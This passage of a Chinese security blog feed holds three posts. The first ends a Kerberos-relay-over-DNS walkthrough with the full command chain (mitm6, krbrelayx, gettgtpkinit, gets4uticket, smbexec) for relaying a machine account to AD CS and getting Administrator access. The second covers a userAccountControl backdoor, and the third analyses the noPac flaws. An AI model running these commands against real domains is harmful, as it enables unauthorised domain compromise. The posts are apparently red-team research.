<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/14.png" alt=""></p>
<p>ADCS 服务器使用 HTTP 返回200 响应，开始申请证书。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/15.png" alt=""></p>
<p>申请证书成功，返回win10机器帐户base64 cert。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/16.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/17.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/18.png" alt=""></p>
<p>利用gettgtpkinit将上一步申请的证书转化为受害者机器win10的TGT。</p>
<p><code>python3 gettgtpkinit.py -pfx-base64 $(cat cert.txt) wd.local/win10$ win10.ccache -dc-ip 192.168.3.1</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/19.png" alt=""></p>
<p>通过gets4uticket将TGT进行S4Utoself模仿域管访问拿到受害者机器最高权限。</p>
<p><code>python3 gets4uticket.py kerberos+ccache://wd.local\\win10\$:win10.ccache@WIN-6ERMGJ5ECL0.wd.local cifs/win10.wd.local@wd.local Administrator@wd.local admin.ccache</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/20.png" alt=""></p>
<h3 id="验证票据是否有效">验证票据是否有效</h3>
<p>通过使用smbexec.py进行验证</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">KRB5CCNAME=admin.ccache
</span></span><span class="line"><span class="cl">python smbexec.py -k wd.local/Administrator@win10.wd.local -no-pass
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/21.png" alt=""></p>
<h2 id="利用整理">利用整理</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.告诉受害者用于更新DNS请求：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo mitm6 --domain redteam.lab --host-allowlist dmwin10.redteam.lab --relay AdcsMachine.redteam.lab -v
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2.将凭证Realy到ADCS web服务请求证书
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 krbrelayx.py --target http://AdcsMachine.redteam.lab/certsrv/ -ip 192.168.129.8 --victim dmwin10.redteam.lab --adcs --template Machine
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3.利用证书获取TGT：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 gettgtpkinit.py -pfx-base64 $(cat cert.txt) redteam.lab/dmwin10$ dmwin10.ccache -dc-ip 192.168.129.131
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4.将TGT进行S4U2self模仿域管访问拿到受害者机器最高权限
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python3 gets4uticket.py kerberos+ccache://redteam.lab\\dmwin10\$:dmwin10.ccache@dc2.redteam.lab cifs/dmwin10.redteam.lab@redteam.lab Administrator@redteam.lab admin.ccache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">5.导入ST进行利用
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">KRB5CCNAME=admin.ccache 
</span></span><span class="line"><span class="cl">python3 ~/in/impacket/examples/smbexec.py -k redteam.lab/Administrator@dmwin10.redteam.lab -no-pass
</span></span></code></pre></div><h2 id="参考">参考</h2>
<p><a href="https://vuls.cert.org/confluence/display/Wiki/2022/02/24/Kerberos+relaying+with+krbrelayx+and+mitm6">https://vuls.cert.org/confluence/display/Wiki/2022/02/24/Kerberos+relaying+with+krbrelayx+and+mitm6</a></p>
<p><a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/">https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/</a></p>
]]></content>
        </item>
        
        <item>
            <title>userAccountControl设置为8192作为后门</title>
            <link>https://lzzbb.github.io/posts/2022/01/useraccountcontrol%E8%AE%BE%E7%BD%AE%E4%B8%BA8192%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8/</link>
            <pubDate>Wed, 12 Jan 2022 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2022/01/useraccountcontrol%E8%AE%BE%E7%BD%AE%E4%B8%BA8192%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8/</guid>
            <description>在twitter上看到有人称更改userAccountControl能达到域内提权的效果，实质有很大限制，可以当做一个后门，但是特征也相当明显 0.o！
来源推特： userAccountControl属性含义 creatorsid可以修改机器的userAccountControl但是不能改为8192
并且修改userAccountControl后primaryGroupId也会随之改变
515 – Domain Computers 516 – Domain Controllers (writable) 521 – Domain Controllers (Read-Only) 即userAccountControl更改之后groupid从515变为516
查看域内域控也会显示</description>
            <content type="html"><![CDATA[<p>在twitter上看到有人称更改userAccountControl能达到域内提权的效果，实质有很大限制，可以当做一个后门，但是特征也相当明显 0.o！</p>
<h3 id="来源推特">来源推特：</h3>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/1.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/2.png" alt=""></p>
<h3 id="useraccountcontrol属性含义">userAccountControl属性含义</h3>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/3.png" alt=""></p>
<p>creatorsid可以修改机器的userAccountControl但是不能改为8192</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/4.png" alt=""></p>
<p>并且修改userAccountControl后primaryGroupId也会随之改变</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">515 – Domain Computers
</span></span><span class="line"><span class="cl">516 – Domain Controllers (writable)
</span></span><span class="line"><span class="cl">521 – Domain Controllers (Read-Only)
</span></span></code></pre></div><p>即userAccountControl更改之后groupid从515变为516</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/5.png" alt=""></p>
<p>查看域内域控也会显示</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/user-Account-Control-backdoor/6.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>Name impersonation and KDC bamboozling 分析</title>
            <link>https://lzzbb.github.io/posts/2021/12/name-impersonation-and-kdc-bamboozling-%E5%88%86%E6%9E%90/</link>
            <pubDate>Thu, 30 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2021/12/name-impersonation-and-kdc-bamboozling-%E5%88%86%E6%9E%90/</guid>
            <description>文章首发于安全客：https://www.anquanke.com/post/id/264500
0x00 漏洞背景 今年十一月Cliff Fisher 在推特披露了CVE-2021-42278和CVE-2021-42287两个关于AD域漏洞相关信息，该漏洞影响巨大，在默认情况下只需一个域用户即可拿到域内最高权限。
0x01 披露时间线 11月10日Cliff Fisher在推特发布了相关的漏洞信息。
12月10日Charlie Clark在博客发布漏洞原理及利用手段。
12月11日cube0x0在github发布了noPac，实现了真正的武器化。
0x02 漏洞概述 漏洞的产生本质是windows机器账户和kerbeors之间协调沟通所产生的逻辑问题。
CVE-2021-42278 - KB5008102  允许攻击者任意修改计算机帐户sAMAccountName字段，进而模拟域控申请票据。
 加入域的机器账户默认由$结尾，samAccountName默认和域机器名一致。但DC没有对sAMAccountName属性进行合法性判断，导致删除sAMAccountName结尾的$照样可以以机器用户身份申请TGT票据。
什么是sAMAccountName
sAMAccountName 属性是一个登录名，用于支持以前版本的 Windows 中的客户端和服务器，例如 Windows NT 4.0、Windows 95、Windows 98 和 LAN Manager。 登录名必须少于 20 个字符，在域中的所有安全主体对象中必须唯一，并且不能包含以下任何字符：
 &amp;ldquo;/ \ [ ] : ; | = , + * ? &amp;lt; &amp;gt;
 userPrincipalName是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：username@domain.name。
域名：redteam.lab SamAccountName：marry NetBIOS登录名：reedteam\marry UserPrincipalName：marry@redteam.lab 在 Active Directory中，存储帐户登录名或用户对象实际上是命名符号“Domain\LogonName ”中使用NetBIOS名称组合，该属性是域用户对象的必需属性；而SAMAccountName应始终与UPN主体名称保持一致，即SAMAccountName必须等于属性“UserPrincipalName” 的前缀部分。
更改sAMAccountName
漏洞凭借修改计算机帐户sAMAccountName字段来模拟域控申请票据，但直接将域内机器Evilsystem的sAMAccountName改为与域控相同(不加$)，结果显示异常。
原因如https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/所说：
 修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。</description>
            <content type="html"><![CDATA[<p>文章首发于安全客：https://www.anquanke.com/post/id/264500</p>
<h2 id="0x00-漏洞背景">0x00 漏洞背景</h2>
<p>今年十一月Cliff Fisher 在推特披露了CVE-2021-42278和CVE-2021-42287两个关于AD域漏洞相关信息，该漏洞影响巨大，在默认情况下只需一个域用户即可拿到域内最高权限。</p>
<h2 id="0x01-披露时间线">0x01 披露时间线</h2>
<p>11月10日Cliff Fisher在推特发布了相关的漏洞信息。</p>
<p>12月10日Charlie Clark在博客发布漏洞原理及利用手段。</p>
<p>12月11日cube0x0在github发布了noPac，实现了真正的武器化。</p>
<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
<p><code>漏洞的产生本质是windows机器账户和kerbeors之间协调沟通所产生的逻辑问题。</code></p>
<h3 id="cve-2021-42278httpsmsrcmicrosoftcomupdate-guideen-usvulnerabilitycve-2021-42278---kb5008102httpssupportmicrosoftcomen-ustopickb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e"><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42278">CVE-2021-42278</a> - <a href="https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e">KB5008102</a></h3>
<blockquote>
<p>允许攻击者任意修改计算机帐户sAMAccountName字段，进而模拟域控申请票据。</p>
</blockquote>
<p>加入域的机器账户默认由$结尾，samAccountName默认和域机器名一致。但DC没有对sAMAccountName属性进行合法性判断，<code>导致删除sAMAccountName结尾的$照样可以以机器用户身份申请TGT票据。</code></p>
<p><strong>什么是sAMAccountName</strong></p>
<p>sAMAccountName 属性是一个登录名，用于支持以前版本的 Windows 中的客户端和服务器，例如 Windows NT 4.0、Windows 95、Windows 98 和 LAN Manager。 登录名必须少于 20 个字符，在域中的所有安全主体对象中必须唯一，并且不能包含以下任何字符：</p>
<blockquote>
<p>&ldquo;/ \ [ ] : ; | = , + * ? &lt; &gt;</p>
</blockquote>
<p>userPrincipalName是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：username@domain.name。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">域名：redteam.lab
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SamAccountName：marry
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">NetBIOS登录名：reedteam\marry
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">UserPrincipalName：marry@redteam.lab
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/1.png" alt=""></p>
<p>在 Active Directory中，存储帐户登录名或用户对象实际上是命名符号“Domain\LogonName ”中使用NetBIOS名称组合，该属性是域用户对象的必需属性；而SAMAccountName应始终与UPN主体名称保持一致，即SAMAccountName必须等于属性“UserPrincipalName” 的前缀部分。</p>
<p><strong>更改sAMAccountName</strong></p>
<p>漏洞凭借修改计算机帐户sAMAccountName字段来模拟域控申请票据，但直接将域内机器Evilsystem的sAMAccountName改为与域控相同(不加$)，结果显示异常。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/2.png" alt=""></p>
<p>原因如<a href="https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/">https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/</a>所说：</p>
<blockquote>
<p>修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。</p>
</blockquote>
<p>添加机器帐户默认会创建4个SPN,包括以下内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. HOST/MachineAccountName
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2. HOST/MachineAccountName.domain.name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3. RestrictedKrbHost/MachineAccountName
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4. RestrictedKrbhost/MachineAccountName.domain.name
</span></span></code></pre></div><p>意味着Evilsystem 将要改成与域控相同的SPN，但是SPN是网络控制器服 务实例的唯一标识符， <code>Kerberos身份验证使用它来将服务实例与服务登录帐户相关联，这时会产生冲突</code>；但servicePrincipalName在设置以上属性之前已被删除，那么SPN列表将不会更新，除非再次给该字段赋值。所以在修改samAccountName前删除其SPN属性。</p>
<p><strong>sAMAccountType属性</strong></p>
<p>sAMAccountType表示在Active Directory 中安全主体对象的帐户类型。<code>在LDAP查询中，常常用其筛选域机器和域用户等其他对象。</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sAMAccountType=268435456（安全组）
</span></span><span class="line"><span class="cl">sAMAccountType=268435457（非安全组）
</span></span><span class="line"><span class="cl">sAMAccountType=536870912（别名对象）
</span></span><span class="line"><span class="cl">sAMAccountType=536870913（非安全别名对象）
</span></span><span class="line"><span class="cl">sAMAccountType=805306369（机器对象）
</span></span></code></pre></div><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/7879be50-7109-41e4-9a44-02f5a007b950"><strong>sAMAccountType</strong></a><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/7879be50-7109-41e4-9a44-02f5a007b950">属性可能存在的值：</a></p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>SAM_DOMAIN_OBJECT</td>
<td>0x0</td>
</tr>
<tr>
<td>SAM_GROUP_OBJECT</td>
<td>0x10000000</td>
</tr>
<tr>
<td>SAM_NON_SECURITY_GROUP_OBJECT</td>
<td>0x10000001</td>
</tr>
<tr>
<td>SAM_ALIAS_OBJECT</td>
<td>0x20000000</td>
</tr>
<tr>
<td>SAM_NON_SECURITY_ALIAS_OBJECT</td>
<td>0x20000001</td>
</tr>
<tr>
<td>SAM_USER_OBJECT</td>
<td>0x30000000</td>
</tr>
<tr>
<td>SAM_MACHINE_ACCOUNT</td>
<td>0x30000001</td>
</tr>
<tr>
<td>SAM_TRUST_ACCOUNT</td>
<td>0x30000002</td>
</tr>
<tr>
<td>SAM_APP_BASIC_GROUP</td>
<td>0x40000000</td>
</tr>
<tr>
<td>SAM_APP_QUERY_GROUP</td>
<td>0x40000001</td>
</tr>
<tr>
<td>SAM_ACCOUNT_TYPE_MAX</td>
<td>0x7ffffff</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"> cn: SAM-Account-Type
</span></span><span class="line"><span class="cl"> ldapDisplayName: sAMAccountType
</span></span><span class="line"><span class="cl"> attributeId: 1.2.840.113556.1.4.302
</span></span><span class="line"><span class="cl"> attributeSyntax: 2.5.5.9
</span></span><span class="line"><span class="cl"> omSyntax: 2
</span></span><span class="line"><span class="cl"> isSingleValued: TRUE
</span></span><span class="line"><span class="cl"> schemaIdGuid: 6e7b626c-64f2-11d0-afd2-00c04fd930c9
</span></span><span class="line"><span class="cl"> systemOnly: FALSE
</span></span><span class="line"><span class="cl"> searchFlags: fATTINDEX
</span></span><span class="line"><span class="cl"> attributeSecurityGuid: 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
</span></span><span class="line"><span class="cl"> isMemberOfPartialAttributeSet: TRUE
</span></span><span class="line"><span class="cl"> systemFlags: FLAG_SCHEMA_BASE_OBJECT | 
</span></span><span class="line"><span class="cl">  FLAG_ATTR_REQ_PARTIAL_SET_MEMBER 
</span></span><span class="line"><span class="cl"> schemaFlagsEx: FLAG_ATTR_IS_CRITICAL
</span></span></code></pre></div><p><strong>UserAccountControl</strong></p>
<p>UserAccountControl包含一系列标志，这些标志定义了用户对象的一些重要基本属性，可以通过分配给该属性的值通知 Windows 每个主体启用了哪些选项。</p>
<p><code>该属性标志是累积性的，比如要禁用用户的帐户，UserAccountControl 属性被设置为 514 (2 + 512)。</code></p>
<p><a href="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm">LEX官网对这个属性进行了整理</a>，以下为常见类型：</p>
<table>
<thead>
<tr>
<th>UF_NORMAL_ACCOUNT ( 512 )</th>
<th>这是一个普通域用户。</th>
</tr>
</thead>
<tbody>
<tr>
<td>UF_WORKSTATION_TRUST_ACCOUNT ( 4096 )</td>
<td>这是一个普通域机器。</td>
</tr>
<tr>
<td>UF_INTERDOMAIN_TRUST_ACCOUNT ( 2048 )</td>
<td>这是一个代表与外部域的信任连接的帐户。通常，帐户名称是域的 NetBIOS 名称，末尾带有“$”。</td>
</tr>
<tr>
<td>UF_SERVER_TRUST_ACCOUNT ( 8192 )</td>
<td>这是一个域控帐户。</td>
</tr>
<tr>
<td>UF_DONT_EXPIRE_PASSWD (65536)</td>
<td>这个用户不受有关域内密码策略相关的影响，且密码永不过期。</td>
</tr>
<tr>
<td>UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED (128)</td>
<td>代表可逆加密存储用户密码 ,如果用户更改密码就能解密获得其明文密码。</td>
</tr>
<tr>
<td>UF_ACCOUNT_DISABLE ( 2 )</td>
<td>代表帐户被禁用，并且无法再向域进行身份验证。</td>
</tr>
</tbody>
</table>
<p><a href="https://blog.csdn.net/xjzdr/article/details/3553246">https://blog.csdn.net/xjzdr/article/details/3553246</a>也对UserAccountControl进行了详细解释。</p>
<hr>
<p>UserAccountControl定义了用户对象的重要基本属性，微软以sAMAccountName的值是否以$结尾来区别windows域内的普通域用户和机器账户。<code>但UserAccountControl并没有规定计算机帐户的sAMAccountName必须以$结尾，域机器sAMAccountName去掉最后的$照样可以以机器账户的身份申请TGT票据，为后面的CVE-2021-42287触发提供了先行条件。</code></p>
<h3 id="cve-2021-42287httpsmsrcmicrosoftcomupdate-guideen-usvulnerabilitycve-2021-42287-kb5008380httpssupportmicrosoftcomen-ustopickb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041"><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42287">CVE-2021-42287</a> <a href="https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041">KB5008380</a></h3>
<blockquote>
<p>影响 Kerberos 特权属性证书 (PAC) 并允许攻击者通过S4U2Self冒充域控申请ST的安全绕过漏洞。</p>
</blockquote>
<p>微软依照是否以$结尾来区别windows域内的普通域用户和机器账户，所以按照惯例默认给机器账户加$，而kerberos认证时并不会区别对待；<code>为了兼容这种情况，如果kerberos认证票据时没有找到对应的域用户，会采用在用户名称后添加$进行重试认证的fallback。</code></p>
<p>在有PAC 的情况下请求 TGT，并且为与DC具有相同的sAMAccountName(不带$)的机器帐户请求 S4U2self 票据，<code>当初始帐户不存在时自动进行重试认证fallback，KDC没有验证请求TGT的帐户是否与服务票证中引用的帐户相同，结果在ST中使用DC的密钥进行加密。</code></p>
<p>在默认设置的 Active Directory 环境中可以通过一个域用户凭证拿到域内最高权限。</p>
<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
<p>微软以是否以$结尾来区别windows域内的普通域用户和机器账户，而kerberos认证时并不会区别对待；为了兼容这种情况，如果kerberos认证票据时没有找到对应的域用户，会采用在用户名称后添加$进行重试认证的fallback。</p>
<p>kerberos认证的CName String/SName String均从sAMAccountName提取，如果域控是DC2$，一台域机器的sAMAccountName被改为DC2。那么当域用户申请TGT后将sAMAccountName更改为其他值，进而在申请ST票据时，kerberos找不到DC2这个机器用户，于是会触发fallback变为DC2$。在S4U阶段生成了新的用于访问自身的高权限PAC，KDC没有识别高权限ST作用于哪个机器账户、PAC也没有原始请求者的信息，于是在ST中使用域控的密钥进行加密，这样就拿到了域控的ST票据，从而模拟域控上任意服务的任意用户进行访问登陆。</p>
<h3 id="xp源码分析">XP源码分析</h3>
<p><a href="https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA">https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA</a>这篇文章写的很清楚，有兴趣可以看看。</p>
<p><strong>KdcGetTicketInfo</strong></p>
<p>首先判断是否是krbtgt账户，如果是则直接调用GetKrbtgt函数获取TicketInfo</p>
<p>判断是否是本域的用户，并进行三次查找:</p>
<ul>
<li>首先直接查找传入的用户</li>
<li>然后查找传入的 <code>username+$</code></li>
<li>仍未找到则查找其 altSecurityIdentities 属性的value</li>
</ul>
<p><code>这就是第一个漏洞产生的原因，sAMAccountName没有$的机器账号如果没有找到会加$进行callback重试。</code></p>
<p><strong>KdcInsertAuthorizationData</strong></p>
<p>KdcInsertAuthorizationData中可以找到KDC Server获取PAC的处理逻辑:</p>
<p>1.如果不是S4U的请求，则直接从TGT的AuthData中提取PAC(沿用最初的PAC)。</p>
<p><code>说明了S4U的重要性，如果没有S4U2self，将会沿用最初的PAC；最初的PAC在AS-REP阶段凭请求用户身份生成，没有权限访问域控相关服务。</code></p>
<p>2.如果是S4U请求，首先调用KdcGetS4UTicketInfo请求获取S4UUserInfo，再调用kdcGetPacAuthData函数来构造PAC data。</p>
<p>kdcGetPacAuthData：若原票据不存在PAC，则会构造一个新的PAC；若无法构造，则直接复制PAC。</p>
<p>KdcGetS4UTicketInfo函数的处理逻辑中又调用了KdcGetTicketInfo，也就是通过这把前后两个漏洞组合在了一起。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/3.png" alt=""></p>
<p>因此得到和上面一样的结论：</p>
<p><code>S4U2self拓展用于AS-REQ将票证检索到自身来模仿任意用户访问，而KDC在S4U2Self阶段会将SFU填充的字段从TGT中的PAC复制到新创建的PAC中。在进行自动添加$进行callback时，KDC并没有识别高权限ST作用于哪个机器账户、PAC也没有原始请求者的信息，出现鉴权问题从而产生漏洞。</code></p>
<h3 id="通过公开exp截取数据分析">通过公开EXP截取数据分析</h3>
<p>wireshark中提供直接将<a href="https://wiki.wireshark.org/Kerberos">keytab 导入Kerberos</a>，能将PAC等加密字段进行解密。</p>
<p><strong>kerberos认证</strong></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/4.png" alt=""></p>
<p><strong>整体流程</strong></p>
<p>1.AS_REQ：client用client_hash（一般使用RC4加密）、时间戳向KDC进行预身份验证。  <!-- raw HTML omitted -->2.AS_REP：KDC检查client_hash与时间戳，如果正确则返回client由krbtgt哈希加密的TGT票据和PAC等相关信息。  <!-- raw HTML omitted -->3.TGS_REQ：client向KDC请求TGS票据，出示其TGT票据和请求的SPN。  <!-- raw HTML omitted -->4.TGS_REP：KDC如果识别出SPN，则将该服务账户的NTLM哈希加密生成的ST票据返回给client。  <!-- raw HTML omitted -->5.AP_REQ：client使用ST请求对应服务，将PAC传递给服务进行检查。服务通过PAC查看用户的SID和用户组等并与自身的ACL进行对比，如果不满足则作为适当的RPC状态代码返回。  <!-- raw HTML omitted -->6.AP_REP：服务器验证AP-REQ，如果验证成功则发送AP-REP，客户端和服务端通过中途生成的Session key等信息通过加解密转换验证对方身份。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/5.png" alt=""></p>
<p><strong>AS-REQ：</strong></p>
<p><code>域控为DC2$，这里申请sAMAccountName为DC2（不带$）的TGT票据</code></p>
<ol>
<li>请求的用户端信息</li>
<li>加密类型</li>
<li>Authenticator（用户Hash加密时间戳）</li>
</ol>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/6.png" alt=""></p>
<p><strong>AS-REP：</strong></p>
<ol>
<li>通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则预认证成功。</li>
<li>生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。</li>
<li>返回TGT（TGT中包含PAC,PAC包含Client的sid，Client所在的组）、Login Session Key、和时间戳。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/7.png" alt=""></p>
<hr>
<p><strong>PAC</strong></p>
<p>PAC由KDC在AS-REP中生成，其中包含用户sid和组等信息，当client在AD域内进行身份认证的时候，KDC会把这些信息添加到TGT票据加密返回；KDC主要通过PAC中的GroupIds和Userid与要访问服务的ACL进行比较，判断client是否有权限对其进行访问。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/8.png" alt=""></p>
<p>KDC在AP-REQ访问服务时检查PAC。同时 TGS 解密验证签名是否正确，然后再重新构造新的 PAC 放在 ST 里返回给client，client将 ST 发送给服务端进行验证，Server再将此信息与用户所索取的资源的ACL进行比较，以此判断用户是否有权限对其进行访问。</p>
<p><code>PAC里面包含了用户SID、组等信息。</code>在 PAC 中包含PAC_SERVER_CHECKSUM 和 PAC_PRIVSVR_CHECKSUM两个数字签名 ，<code>这两个数字签名分别由Server NTLM Hash和KDC NTLM Hash加密，并且PAC对于用户和服务全程都不可见，只有KDC能制作和查看PAC。</code></p>
<p>PAC结构是一个AuthorizationData</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">AuthorizationData</span>       <span class="o">::=</span> <span class="nx">SEQUENCE</span> <span class="nx">OF</span> <span class="nx">SEQUENCE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ad</span><span class="o">-</span><span class="nx">type</span>         <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="nx">Int32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">ad</span><span class="o">-</span><span class="nx">data</span>         <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="nx">OCTET</span> <span class="nx">STRING</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>结构如下：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/9.png" alt=""></p>
<p>可以看到ad-type为AD-IF-RELEVANT。</p>
<p>ad-data也是一个AuthorizationData，ad-type为AD-WIN2K-PAC，ad-data为一个PACTYPE的结构体和几个PAC_INFO_BUFFER 结构数组；PACTYPE结构是PAC的最顶层结构，指定PAC_INFO_BUFFER数组中的元素数。PACTYPE结构用作完整PAC数据的标头。</p>
<p>每个 PAC_INFO_BUFFER 定义了 PAC 缓冲区的类型和字节偏移量，用作指向遵循此标头的PAC内容的指针。PAC_INFO_BUFFER 数组没有定义的顺序，因此PAC_INFO_BUFFER 缓冲区的顺序没有意义。但是，一旦生成了 KDC 和服务器签名，缓冲区的顺序不得更改，否则 PAC 内容的签名验证将失败。</p>
<p>PACTYPE结构如下：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/10.png" alt=""></p>
<p>PAC_INFO_BUFFER结构如下：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/nopac/11.png" alt=""></p>
<p>其中ulType描述在Offset处包含的缓冲区中存在的数据类型。</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00000001</td>
<td>登录信息。PAC结构必须包含一个此类型的缓冲区。必须忽略其他登录信息缓冲区。</td>
</tr>
<tr>
<td>0x00000002</td>
<td>凭证信息。PAC结构不应包含多个此类缓冲区。第二个或后续凭证信息缓冲区在收到时必须忽略。</td>
</tr>
<tr>
<td>0x00000006</td>
<td>服务器校验和。PAC结构必须包含一个此类型的缓冲区。必须忽略其他登录服务器校验和缓冲区。</td>
</tr>
<tr>
<td>0x00000007</td>
<td>KDC校验和。PAC结构必须包含一个此类型的缓冲区。必须忽略其他KDC校验和缓冲区。</td>
</tr>
<tr>
<td>0x0000000A</td>
<td>客户名称和票据信息。PAC结构必须包含一个此类型的缓冲区。必须忽略其他客户端和票证信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000B</td>
